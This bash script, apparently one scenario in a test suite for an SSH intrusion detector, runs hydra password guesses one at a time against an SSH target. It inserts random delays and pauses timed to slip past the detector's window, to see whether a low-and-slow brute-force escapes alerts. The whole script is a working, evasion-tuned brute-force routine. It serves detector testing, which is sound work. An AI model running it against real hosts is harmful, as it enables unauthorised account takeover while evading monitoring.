#!/usr/bin/env bash
set -Eeuo pipefail

source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/common.sh"

require_hydra
start_detector

PASS_FILE="${RUN_DIR}/passwords_evasion.txt"
make_password_file "$PASS_FILE" "${PASSWORD_COUNT:-36}"

MIN_GAP_SEC="${MIN_GAP_SEC:-8}"
MAX_GAP_SEC="${MAX_GAP_SEC:-25}"
NOISE_EVERY="${NOISE_EVERY:-6}"

log "Scenario 03: evasion low-and-slow with jitter/noise"
log "Question: Can a slow or noisy brute-force avoid ALERT/BLOCK?"
log "Attempts=${PASSWORD_COUNT:-36}, gap=${MIN_GAP_SEC}-${MAX_GAP_SEC}s, noise_every=${NOISE_EVERY}"

attempt=0
while read -r password; do
  attempt=$((attempt + 1))
  log "Evasion attempt ${attempt}"
  hydra \
    -l "$TARGET_USER" \
    -p "$password" \
    -s "$TARGET_PORT" \
    -t 1 \
    -w "${HYDRA_WAIT:-5}" \
    "ssh://${TARGET_HOST}" >> "${RUN_DIR}/hydra_evasion.log" 2>&1 || true

  if (( attempt % NOISE_EVERY == 0 )); then
    log "Noise pause inserted"
    sleep "$((IDS_WINDOW_SEC + 3))"
  else
    gap=$((MIN_GAP_SEC + RANDOM % (MAX_GAP_SEC - MIN_GAP_SEC + 1)))
    sleep "$gap"
  fi
done < "$PASS_FILE"

sleep "$((IDS_POLL_SEC + 5))"
log "Expected result: if no ALERT/BLOCK appears, document this as a low-and-slow evasion weakness."
